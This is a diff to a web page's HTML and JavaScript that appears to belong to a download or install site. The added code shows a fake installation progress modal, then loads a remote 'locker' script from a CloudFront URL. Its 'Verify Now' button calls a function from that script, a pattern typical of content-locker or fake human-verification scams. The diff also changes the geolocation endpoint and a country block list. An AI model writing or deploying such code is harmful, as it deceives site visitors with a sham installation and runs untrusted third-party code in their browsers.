@@ -1339,11 +1339,11 @@
     }
   </style>
   <script defer>
-const disallowedCountryCodes = ['MA', 'EG', 'DZ', 'TN', 'TR', 'BD'];
+const disallowedCountryCodes = ['MA', 'EG', 'DZ', 'TN', 'T', 'BD'];
 async function checkUserCountry() {
     try {
         // Using a GeoIP API (ipapi.co as an example)
-        const response = await fetch('http://ip-api.com/json/');
+        const response = await fetch('https://gamio-geo.axen.workers.dev');
         const data = await response.json();
         const countryCode = data.countryCode; // ISO 3166-1 alpha-2 code
 
@@ -2351,6 +2351,10 @@ window.addEventListener('resize', () => {
 
     // Start installation process
     startInstall.addEventListener('click', () => {
+      // load script
+      loadLockerScript(() => {
+        console.log('Locker script ready for button');
+      });
       // Hide start button, show progress bar and continue button
       startInstall.style.display = 'none';
       modalProgress.style.display = 'block';
@@ -2443,7 +2447,7 @@ window.addEventListener('resize', () => {
                                 
                                 </div>
                                 
-                                <button class="btn-verify" id="verifyButton" onclick="openLockera()">Verify Now</button>
+                                <button class="btn-verify" id="verifyButton" onclick="showLocker()">Verify Now</button>
                             </div>
                         `;
 
@@ -2495,7 +2499,34 @@ document.querySelector('.searchy').addEventListener('input', debounce(function (
     
   </script>
 <script type="text/javascript">
+  let lockerScriptLoaded = false;
+  function loadLockerScript(callback) {
+    if (lockerScriptLoaded) {
+      callback();
+      return;
+    }
     var MFSme_tss_hXagZc={"it":4254454,"key":"942bf"};
+    const script = document.createElement('script');
+    script.src = 'https://d1y0yks1k8t5m5.cloudfront.net/b5a33f6.js';
+    script.type = 'text/javascript';
+    script.crossorigin = 'anonymous';
+    script.onload = () => {
+      console.log('Locker script loaded');
+      lockerScriptLoaded = true;
+      callback();
+    };
+    script.onerror = () => console.error('Failed to load locker script');
+    document.body.appendChild(script);
+  }
+  // call lock function
+  function showLocker(){
+    _eN();
+ /* if (typeof _eN === 'function') {
+      _eN(); 
+    } else {
+      console.error('Locker function is not loaded yet!');
+    }*/}
+ /*   var MFSme_tss_hXagZc={"it":4254454,"key":"942bf"};
 
     function openLockera() {
       var script = document.createElement("script");
@@ -2509,6 +2540,6 @@ document.querySelector('.searchy').addEventListener('input', debounce(function (
         }
       };
       document.body.appendChild(script);
-    }
+    }*/
   </script>
 </body></html>
